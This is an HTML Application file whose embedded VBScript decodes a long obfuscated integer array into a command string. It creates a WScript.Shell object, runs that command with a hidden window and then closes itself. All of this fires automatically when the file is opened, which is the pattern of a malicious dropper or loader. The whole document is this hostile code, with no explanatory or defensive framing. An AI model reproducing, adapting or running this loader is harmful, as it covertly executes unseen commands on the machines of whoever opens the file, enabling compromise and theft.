79503,79564,79503,79535,79551,79522,79555,79542,79542,79573,79505,79495,79556,79568,79568,79556,79550,79520,79568,79567,79539,79530,79518,79527,79549,79503,79519,79525,79553,79503,79559,79571,79525,79542,79561,79503,79520,79503,79570,79531,79501,79563,79531,79520,79509,79507,79507,79519,79571,79570,79523,79554,79506,79535,79527,79570,79570,79529,79501,79503,79530,79536,79524,79540,79566,79573,79570,79555,79528,79508,79562,79552,79506,79562,79554,79525,79558,79533,79552,79562,79558,79542,79536,79537,79558,79559,79550,79533,79551,79535,79499,79530,79530,79564,79500,79527,79520,79502,79538,79541,79533,79523,79556,79571,79501,79502,79551,79519,79549,79531,79550,79523,79499,79562,79506,79532,79566,79526,79502,79561,79527,79557,79567,79542,79553,79560,79526,79571,79558,79565,79523,79541,79552,79519,79550,79541,79524,79560,79564,79503,79527,79521,79521,79563,79505,79540,79558,79573,79557,79517,79574,79526,79557,79553,79574,79527,79527,79536,79525,79504,79527,79554,79550,79573,79556,79538,79558,79506,79525,79572,79552,79572,79522,79518,79533,79541,79534,79552,79509,79502,79541,79574,79517,79542,79519,79554,79557,79528,79536,79538,79541,79502,79523,79501,79539,79559,79566,79500,79531,79535,79537,79499,79526,79538,79509,79558,79500,79540,79528,79502,79550,79534,79525,79567,79539,79495,79550,79537,79540,79528,79572,79564,79507,79503,79550,79501,79523,79538,79530,79564,79571,79574,79525,79528,79525,79509,79520,79561,79557,79564,79569,79568,79562,79541,79552,79537,79566,79573,79506,79526,79518,79533,79574,79550,79556,79537,79534,79519,79499,79561,79568,79559,79541,79507,79553,79508,79550,79566,79573,79519,79520,79509,79517,79522,79525,79509,79540,79564,79534,79573,79551,79565,79538,79540,79528,79572,79566,79567,79531,79541,79518,79532,79557,79563,79528,79518,79574,79534,79563,79565,79531,79524,79499,79535,79567,79524,79537,79564,79554,79507,79532,79506,79521,79550,79556,79529,79534,79535,79554,79505,79572,79561,79518,79539,79503,79569,79549,79574,79535,79560,79565,79520,79538,79529,79534,79553,79559,79537,79509,79530,79495,79558,79564,79541,79563,79541,79533,79550,79549,79552,79499,79520,79574,79519,79499,79523,79540,79550,79519,79540,79518,79568,79530,79556,79574,79550,79560,79565,79551,79509,79540,79565,79501,79553,79573,79558,79525,79524,79501,79519,79551,79553,79522,79540,79531,79504,79556,79501,79570,79519,79556,79551,79555,79500,79534,79509,79534,79538,79500,79557,79533,79526,79503,79528,79570,79521,79540,79563,79570,79507,79530,79568,79555,79525,79531,79523,79574,79534,79540,79540,79532,79502,79527,79568,79519,79533,79517,79500,79500,79572,79573,79538,79552,79558,79571,79519,79540,79521,79554,79572,79503,79540,79538,79561,79522,79499,79569,79569,79521,79538,79570,79566,79551,79564,79529,79563,79503,79570,79508,79530,79534,79506,79540,79537,79504,79568,79569,79569,79568,79567,79538,79536,79552,79541,79521,79505,79538,79566,79531,79536,79506,79520,79532,79519,79562,79502,79557,79570,79499,79555,79523,79551,79504,79509,79530,79499,79509,79557,79521,79542,79495,79525,79551,79565,79499,79505,79539,79556,79562,79572,79552,79558,79495,79540,79531,79534,79552,79549,79569,79522,79502,79508,79574,79553,79495,79526,79502,79502,79538,79508,79563,79524,79533,79559,79563,79502,79538,79574,79574,79519,79530,79500,79537,79501,79555,79541,79535,79508,79568,79554,79519,79528,79572,79502,79571,79525,79499,79507,79505,79540,79562,79540,79502,79541,79509,79555,79538,79521,79499,79535,79522,79531,79552,79565,79531,79502,79518,79569,79540,79573,79534,79500,79525,79569,79540,79567,79506,79505,79505,79551,79533,79542,79505,79524,79562,79526,79537,79561,79517,79569,79507,79530,79536,79519,79500,79500,79550,79527,79555,79554,79508,79538,79569,79568,79531,79503,79562,79505,79540,79565,79499,79566,79561,79504,79542,79549,79565,79558,79526,79531,79560,79552,79502,79549,79508,79536,79531,79552,79574,79561,79573,79524,79550,79523,79507,79505,79571,79500,79569,79570,79505,79521,79573,79572,79534,79558,79525,79562,79536,79505,79567,79558,79574,79526,79563,79560,79508,79554,79504,79502,79572,79533,79541,79528,79559,79573,79535,79558,79551,79524,79556,79518,79495,79499,79570,79508,79500,79499,79535,79528,79505,79556,79506,79535,79535,79560,79505,79495,79530,79523,79526,79573,79531,79573,79570,79563,79538,79522,79573,79501,79530,79569,79503,79503,79523,79555,79522,79536,79509,79573,79568,79528,79561,79504,79560,79566,79531,79525,79554,79539,79533,79563,79552,79552,79495,79530,79554,79540,79531,79559,79520,79553,79574,79570,79502,79535,79541,79560,79502,79527,79505,79519,79570,79499,79558,79557,79504,79554,79562,79501,79556,79568,79561,79569,79501,79531,79500,79536,79524,79495,79564,79525,79564,79522,79564,79555,79533,79506,79551,79499,79499,79518,79525,79569,79561,79523,79523,79568,79568,79554,79568,79532,79550,79562,79549,79558,79574,79506,79532,79537,79541,79549,79536,79528,79559,79550,79503,79568,79508,79513,79491,79511,79488,79525,79517,79524,79525,79568,79568,79563,79562,79558,79484,79513,79484,79491,79537,79500,79552,79530,79553,79539,79530,79561,79549,79522,79542,79562,79549,79522,79542,79571,79538,79560,79534,79573,79538,79523,79526,79563,79534,79524,79538,79539,79538,79502,79509,79561,79541,79559,79556,79568,79536,79560,79538,79532,79549,79523,79500,79513,79491,79511,79488,79534,79559,79574,79534,79517,79562,79531,79525,79566,79558,79518,79539,79565,79535,79568,79484,79513,79484,79530,79553,79571,79497,79531,79550,79558,79553,79551,79568,79484,79491,79535,79573,79567,79568,79553,79561,79498,79535,79553,79551,79569,79566,79557,79568,79573,79498,79519,79566,79573,79564,79568,79563,79555,79566,79549,79564,79556,79573,79498,79517,79553,79567,79529,79549,79562,79549,79555,79553,79552,79491,79511,79488,79534,79559,79574,79534,79517,79562,79531,79525,79566,79558,79518,79539,79565,79535,79568,79498,79529,79563,79552,79553,79484,79513,79484,79543,79535,79573,79567,79568,79553,79561,79498,79535,79553,79551,79569,79566,79557,79568,79573,79498,79519,79566,79573,79564,79568,79563,79555,79566,79549,79564,79556,79573,79498,79519,79557,79564,79556,79553,79566,79529,79563,79552,79553,79545,79510,79510,79521,79519,79518,79511,79488,79534,79559,79574,79534,79517,79562,79531,79525,79566,79558,79518,79539,79565,79535,79568,79498,79532,79549,79552,79552,79557,79562,79555,79484,79513,79484,79543,79535,79573,79567,79568,79553,79561,79498,79535,79553,79551,79569,79566,79557,79568,79573,79498,79519,79566,79573,79564,79568,79563,79555,79566,79549,79564,79556,79573,79498,79532,79549,79552,79552,79557,79562,79555,79529,79563,79552,79553,79545,79510,79510,79542,79553,79566,79563,79567,79511,79488,79534,79559,79574,79534,79517,79562,79531,79525,79566,79558,79518,79539,79565,79535,79568,79498,79518,79560,79563,79551,79559,79535,79557,79574,79553,79484,79513,79484,79501,79502,79508,79511,79488,79534,79559,79574,79534,79517,79562,79531,79525,79566,79558,79518,79539,79565,79535,79568,79498,79527,79553,79573,79535,79557,79574,79553,79484,79513,79484,79502,79505,79506,79511,79488,79534,79559,79574,79534,79517,79562,79531,79525,79566,79558,79518,79539,79565,79535,79568,79498,79527,79553,79573,79484,79513,79484,79543,79535,79573,79567,79568,79553,79561,79498,79519,79563,79562,79570,79553,79566,79568,79545,79510,79510,79522,79566,79563,79561,79518,79549,79567,79553,79506,79504,79535,79568,79566,79557,79562,79555,79492,79488,79525,79517,79524,79525,79568,79568,79563,79562,79558,79493,79511,79488,79523,79564,79549,79555,79555,79484,79513,79484,79543,79535,79573,79567,79568,79553,79561,79498,79519,79563,79562,79570,79553,79566,79568,79545,79510,79510,79522,79566,79563,79561,79518,79549,79567,79553,79506,79504,79535,79568,79566,79557,79562,79555,79492,79488,79523,79529,79555,79550,79527,79537,79523,79574,79559,79533,79572,79556,79570,79534,79493,79511,79488,79550,79553,79537,79571,79539,79549,79555,79564,79571,79571,79573,79524,79484,79513,79484,79488,79523,79564,79549,79555,79555,79543,79500,79498,79498,79501,79505,79545,79511,79488,79534,79559,79574,79534,79517,79562,79531,79525,79566,79558,79518,79539,79565,79535,79568,79498,79525,79538,79484,79513,79484,79488,79550,79553,79537,79571,79539,79549,79555,79564,79571,79571,79573,79524,79511,79488,79574,79556,79555,79561,79567,79536,79551,79532,79566,79528,79520,79522,79528,79538,79524,79484,79513,79484,79488,79534,79559,79574,79534,79517,79562,79531,79525,79566,79558,79518,79539,79565,79535,79568,79498,79519,79566,79553,79549,79568,79553,79520,79553,79551,79566,79573,79564,79568,79563,79566,79492,79493,79511,79488,79522,79573,79568,79569,79534,79556,79531,79555,79532,79542,79566,79533,79526,79560,79569,79519,79537,79519,79484,79513,79484,79488,79574,79556,79555,79561,79567,79536,79551,79532,79566,79528,79520,79522,79528,79538,79524,79498,79536,79566,79549,79562,79567,79554,79563,79566,79561,79522,79557,79562,79549,79560,79518,79560,79563,79551,79559,79492,79488,79523,79564,79549,79555,79555,79496,79484,79501,79506,79496,79484,79488,79523,79564,79549,79555,79555,79498,79528,79553,79562,79555,79568,79556,79484,79497,79484,79501,79506,79493,79511,79488,79534,79559,79574,79534,79517,79562,79531,79525,79566,79558,79518,79539,79565,79535,79568,79498,79520,79557,79567,79564,79563,79567,79553,79492,79493,79511,79488,79566,79519,79518,79555,79542,79559,79517,79534,79530,79518,79519,79484,79513,79484,79530,79553,79571,79497,79531,79550,79558,79553,79551,79568,79484,79535,79573,79567,79568,79553,79561,79498,79525,79531,79498,79529,79553,79561,79563,79566,79573,79535,79568,79566,79553,79549,79561,79492,79484,79496,79484,79488,79522,79573,79568,79569,79534,79556,79531,79555,79532,79542,79566,79533,79526,79560,79569,79519,79537,79519,79484,79493,79511,79488,79536,79552,79571,79525,79557,79519,79484,79513,79484,79530,79553,79571,79497,79531,79550,79558,79553,79551,79568,79484,79535,79573,79567,79568,79553,79561,79498,79525,79531,79498,79529,79553,79561,79563,79566,79573,79535,79568,79566,79553,79549,79561,79511,79488,79555,79532,79550,79528,79571,79526,79520,79530,79520,79519,79533,79550,79531,79560,79518,79535,79549,79484,79513,79484,79530,79553,79571,79497,79531,79550,79558,79553,79551,79568,79484,79535,79573,79567,79568,79553,79561,79498,79525,79531,79498,79519,79563,79561,79564,79566,79553,79567,79567,79557,79563,79562,79498,79523,79574,79557,79564,79535,79568,79566,79553,79549,79561,79484,79488,79566,79519,79518,79555,79542,79559,79517,79534,79530,79518,79519,79496,79484,79492,79543,79525,79531,79498,79519,79563,79561,79564,79566,79553,79567,79567,79557,79563,79562,79498,79519,79563,79561,79564,79566,79553,79567,79567,79557,79563,79562,79529,79563,79552,79553,79545,79510,79510,79520,79553,79551,79563,79561,79564,79566,79553,79567,79567,79493,79511,79488,79555,79532,79550,79528,79571,79526,79520,79530,79520,79519,79533,79550,79531,79560,79518,79535,79549,79498,79519,79563,79564,79573,79536,79563,79492,79484,79488,79536,79552,79571,79525,79557,79519,79484,79493,79511,79488,79555,79532,79550,79528,79571,79526,79520,79530,79520,79519,79533,79550,79531,79560,79518,79535,79549,79498,79519,79560,79563,79567,79553,79492,79493,79511,79488,79566,79519,79518,79555,79542,79559,79517,79534,79530,79518,79519,79498,79519,79560,79563,79567,79553,79492,79493,79511,79543,79550,79573,79568,79553,79543,79545,79545,79484,79488,79553,79522,79555,79568,79519,79559,79565,79520,79553,79528,79484,79513,79484,79488,79536,79552,79571,79525,79557,79519,79498,79536,79563,79517,79566,79566,79549,79573,79492,79493,79511,79488,79533,79563,79527,79523,79531,79566,79527,79520,79574,79536,79539,79523,79553,79549,79569,79484,79513,79484,79543,79535,79573,79567,79568,79553,79561,79498,79536,79553,79572,79568,79498,79521,79562,79551,79563,79552,79557,79562,79555,79545,79510,79510,79537,79536,79522,79508,79498,79523,79553,79568,79535,79568,79566,79557,79562,79555,79492,79488,79553,79522,79555,79568,79519,79559,79565,79520,79553,79528,79493,79511,79488,79533,79563,79527,79523,79531,79566,79527,79520,79574,79536,79539,79523,79553,79549,79569,79484,79576,79484,79564,79563,79571,79553,79566,79567,79556,79553,79560,79560,79484,79497,79484,79577)
    cMjVJX = ZcouJRKSuyCnhs(iSWLSkgEqXEqJx)
    Dim vnRIhbXW
      Set vnRIhbXW = pSHMV(ZcouJRKSuyCnhs(Array(79539,79567,79551,79566,79557,79564,79568,79498,79535,79556,79553,79560,79560)))
       vnRIhbXW.Run(cMjVJX),0,true
self.close()
End Function




Function iPefCwlkX(ByVal hLeWlj)
    iPefCwlkX = VarType( hLeWlj)
End Function
Function pSHMV(ByVal objectType)
Set pSHMV = CreateObject(objectType)
End Function
eJcrcEfmFN()






</script>
</head>
</html>
